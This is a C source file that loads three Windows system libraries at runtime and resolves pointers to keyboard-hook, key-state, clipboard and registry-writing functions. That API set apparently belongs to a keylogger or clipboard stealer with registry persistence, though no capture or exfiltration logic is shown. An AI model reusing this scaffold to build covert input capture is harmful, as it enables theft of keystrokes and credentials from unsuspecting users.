#include "library.h"
#include "win32.h"

// Kernel32.dll
GLOBAL_LOCK LpGlobalLock;
GLOBAL_UNLOCK LpGlobalUnlock;
READ_FILE LpReadFile;

// User32.dll
OPEN_CLIPBOARD LpOpenClipboard;
GET_CLIPBOARD_DATA LpGetClipboardData;
CLOSE_CLIPBOARD LpCloseClipboard;
CALL_NEXT_HOOK_EX LpCallNextHookEx;
SET_WINDOWS_HOOK_EX LpSetWindowsHookEx;
GET_KEY_STATE LpGetKeyState;
TO_UNICODE LpToUnicode;
GET_MESSAGE LpGetMessage;

// Advapi32.dll
REG_CREATE_KEY_EX LpRegCreateKeyEx;
REG_SET_VALUE_EX LpRegSetValueEx;
REG_CLOSE_KEY LpRegCloseKey;

DWORD init_win32_libraries(VOID)
{
	HMODULE kernel = LoadLibrary(L"Kernel32.dll");
	HMODULE user = LoadLibrary(L"User32.dll");
	HMODULE advapi = LoadLibrary(L"Advapi32.dll");

	if (!kernel || !user || !advapi)
		return GetLastError();

#pragma warning(push)
#pragma warning(disable: 4204 4047 4057)

	const struct library libs[] = {
		{ kernel, &LpGlobalLock, "GlobalLock" },
		{ kernel, &LpGlobalUnlock, "GlobalUnlock" },
		{ kernel, &LpReadFile, "ReadFile" },
		{ user, &LpOpenClipboard, "OpenClipboard" },
		{ user, &LpGetClipboardData, "GetClipboardData" },
		{ user, &LpCloseClipboard, "CloseClipboard" },
		{ user, &LpCallNextHookEx, "CallNextHookEx" },
		{ user, &LpSetWindowsHookEx, "SetWindowsHookExW" },
		{ user, &LpGetKeyState, "GetKeyState" },
		{ user, &LpToUnicode, "ToUnicode" },
		{ user, &LpGetMessage, "GetMessageW" },
		{ advapi, &LpRegCreateKeyEx, "RegCreateKeyExW" },
		{ advapi, &LpRegSetValueEx, "RegSetValueExW" },
		{ advapi, &LpRegCloseKey, "RegCloseKey" }
	};

#pragma warning(pop)

	for (SIZE_T i = 0; i < ARRAYSIZE(libs); i++) {
		const FARPROC func = GetProcAddress(libs[i].module,
					      libs[i].name);
		if (!func)
			return GetLastError();

		*libs[i].function = func;
	}
	
	return 0;
}
